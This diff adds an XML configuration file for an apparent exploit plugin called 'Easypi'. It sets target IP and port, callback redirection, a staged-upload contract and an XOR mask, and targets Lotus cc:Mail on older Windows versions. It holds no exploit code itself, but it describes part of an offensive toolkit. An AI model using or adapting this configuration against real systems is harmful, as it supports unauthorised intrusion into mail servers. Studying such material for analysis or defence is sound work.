@@ -1,0 +1,67 @@
+<?xml version="1.0"?>
+<t:config id="c72514379eaad943b62f4080a5ae1dc61619f0f3"
+          name="Easypi"
+          version="3.1.0"
+          configversion="3.1.0.0"
+          xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
+          xmlns:t='tc0'>
+  <t:inputparameters>
+<!-- All plugins that accept a callback must have the Callback* parameters
+     listed below, or their equivalents. -->
+    <t:parameter name="NetworkTimeout"
+                 description="Timeout for blocking network calls (in seconds).  Use -1 for no timeout."
+                 type="S16"
+                 default="180"/>
+    <t:parameter name="TargetIp"
+                 description="Target IP Address"
+                 type="IPv4"/>
+    <t:parameter name="TargetPort"
+                 description="Port used by ccMail"
+                 type="TcpPort"
+                 default="3264"/>
+     <t:parameter name="Connections"
+                 description="Number of parallel connections to attempt"
+                 type="S32"
+                 default="20"/>
+  </t:inputparameters>
+
+  <t:outputparameters>
+      <t:parameter name="ConnectedTcp"
+                 description="Connected TCP Socket to target"
+                 type="Socket"/>
+    <t:parameter name="Contract"
+                 description="Plugin contract"
+                 type="String"
+                 value="StagedUpload" />
+    <t:parameter name="XorMask"
+                 description=""
+                 type="U8"/>    
+  </t:outputparameters>
+
+  <t:redirection>
+     <t:local protocol="TCP"
+              listenaddr="TargetIp"
+              listenport="TargetPort"
+              destaddr="//identifier"
+              destport="//service[name='ccmail']/port"
+              closeoncompletion="true"/>
+     <t:remote protocol="TCP"
+               listenaddr="CallbackIp"
+               listenport="CallbackPort"
+               destport="CallbackLocalPort"/>
+  </t:redirection>
+
+  <t:logic>
+    <t:and>
+      <t:service name="ccmail">
+        <t:product name="Lotus cc:Mail"/>
+      </t:service>
+      <t:or>
+        <t:os family="windows" name="Windows NT"/>
+        <t:os family="windows" name="Windows 2000"/>
+        <t:os family="windows" name="Windows XP"/>
+        <t:os family="windows" name="Windows 2003"/>
+      </t:or>
+    </t:and>
+  </t:logic>
+</t:config>
